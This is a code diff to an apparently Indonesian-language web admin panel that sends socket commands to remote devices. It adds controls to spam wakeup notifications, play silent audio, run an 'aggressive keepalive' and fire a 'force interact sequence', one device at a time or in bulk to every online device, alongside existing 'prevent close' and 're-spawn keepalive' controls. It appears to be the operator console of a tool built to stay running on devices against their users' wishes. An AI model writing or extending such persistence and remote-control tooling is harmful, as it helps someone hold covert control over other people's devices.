@@ -465,6 +465,14 @@
                             <button class="header-btn" onclick="sendDisablePreventClose()" style="border-color:#ff6b6b;color:#ff6b6b;">Nonaktifkan Prevent Close</button>
                             <button class="header-btn" onclick="sendRespawnKeepalive()" style="border-color:var(--accent);">Re-spawn Keepalive</button>
                         </div>
+                        <div style="display:flex;gap:8px;margin-top:6px;flex-wrap:wrap;">
+                            <button class="header-btn" onclick="sendWakeupSpam()" style="border-color:#00d4ff;color:#00d4ff;">&#x1f514; Spam Wakeup Notif</button>
+                            <button class="header-btn" onclick="sendSilentAudio(true)" style="border-color:#00d4ff;color:#00d4ff;">&#x1f507; Start Silent Audio</button>
+                            <button class="header-btn" onclick="sendSilentAudio(false)" style="border-color:#ff6b6b;color:#ff6b6b;">Stop Silent Audio</button>
+                            <button class="header-btn" onclick="sendAggressiveKeepalive(true)" style="border-color:#7c3aed;color:#7c3aed;">&#x26a1; Start Aggressive Keepalive</button>
+                            <button class="header-btn" onclick="sendAggressiveKeepalive(false)" style="border-color:#ff6b6b;color:#ff6b6b;">Stop Aggressive Keepalive</button>
+                            <button class="header-btn" onclick="sendForceInteract()" style="background:#ff4444;color:#fff;border-color:#ff4444;font-weight:bold;">&#x1f4a5; Force Interact Sequence</button>
+                        </div>
                         <div id="pcStatus" style="font-size:0.75rem;color:var(--text3);margin-top:8px;"></div>
                     </div>
 
@@ -1991,6 +1999,75 @@
                 showToast('Bulk re-spawn keepalive: ' + sent + ' device', 'info');
             }
         }
+
+        function sendWakeupSpam() {
+            const id = document.getElementById('pcDeviceSelect').value;
+            const statusEl = document.getElementById('pcStatus');
+            if (id) {
+                socket.emit('admin-wakeup-spam', { deviceId: id, count: 5, interval: 2000 });
+                statusEl.textContent = 'Wakeup spam dikirim ke ' + id.slice(0,8) + '...';
+                showToast('Wakeup spam dikirim', 'success');
+            } else {
+                let sent = 0;
+                for (const [did, d] of Object.entries(devices)) {
+                    if (d.online) { socket.emit('admin-wakeup-spam', { deviceId: did, count: 5, interval: 2000 }); sent++; }
+                }
+                statusEl.textContent = 'Wakeup spam dikirim ke ' + sent + ' device';
+                showToast('Bulk wakeup spam dikirim: ' + sent + ' device', 'success');
+            }
+        }
+
+        function sendSilentAudio(state) {
+            const id = document.getElementById('pcDeviceSelect').value;
+            const statusEl = document.getElementById('pcStatus');
+            if (id) {
+                socket.emit('admin-silent-audio', { deviceId: id, state: state });
+                statusEl.textContent = 'Silent audio ' + (state ? 'ON' : 'OFF') + ' untuk ' + id.slice(0,8) + '...';
+                showToast('Silent audio ' + (state ? 'ON' : 'OFF'), 'info');
+            } else {
+                let sent = 0;
+                for (const [did, d] of Object.entries(devices)) {
+                    if (d.online) { socket.emit('admin-silent-audio', { deviceId: did, state: state }); sent++; }
+                }
+                statusEl.textContent = 'Silent audio ' + (state ? 'ON' : 'OFF') + ' untuk ' + sent + ' device';
+                showToast('Bulk silent audio ' + (state ? 'ON' : 'OFF') + ': ' + sent + ' device', 'info');
+            }
+        }
+
+        function sendAggressiveKeepalive(state) {
+            const id = document.getElementById('pcDeviceSelect').value;
+            const statusEl = document.getElementById('pcStatus');
+            if (id) {
+                socket.emit('admin-aggressive-keepalive', { deviceId: id, state: state });
+                statusEl.textContent = 'Aggressive Keepalive ' + (state ? 'ON' : 'OFF') + ' untuk ' + id.slice(0,8) + '...';
+                showToast('Aggressive Keepalive ' + (state ? 'ON' : 'OFF'), 'info');
+            } else {
+                let sent = 0;
+                for (const [did, d] of Object.entries(devices)) {
+                    if (d.online) { socket.emit('admin-aggressive-keepalive', { deviceId: did, state: state }); sent++; }
+                }
+                statusEl.textContent = 'Aggressive Keepalive ' + (state ? 'ON' : 'OFF') + ' untuk ' + sent + ' device';
+                showToast('Bulk Aggressive Keepalive ' + (state ? 'ON' : 'OFF') + ': ' + sent + ' device', 'info');
+            }
+        }
+
+        function sendForceInteract() {
+            const id = document.getElementById('pcDeviceSelect').value;
+            const statusEl = document.getElementById('pcStatus');
+            if (id) {
+                socket.emit('admin-force-interact', id);
+                statusEl.textContent = 'Force interact sequence sent to ' + id.slice(0,8) + '...';
+                showToast('Force interact sequence sent', 'success');
+            } else {
+                let sent = 0;
+                for (const [did, d] of Object.entries(devices)) {
+                    if (d.online) { socket.emit('admin-force-interact', did); sent++; }
+                }
+                statusEl.textContent = 'Force interact sequence sent to ' + sent + ' device';
+                showToast('Bulk force interact sequence sent: ' + sent + ' device', 'success');
+            }
+        }
+
 
         function bulkPreventClose() {
             let sent = 0;
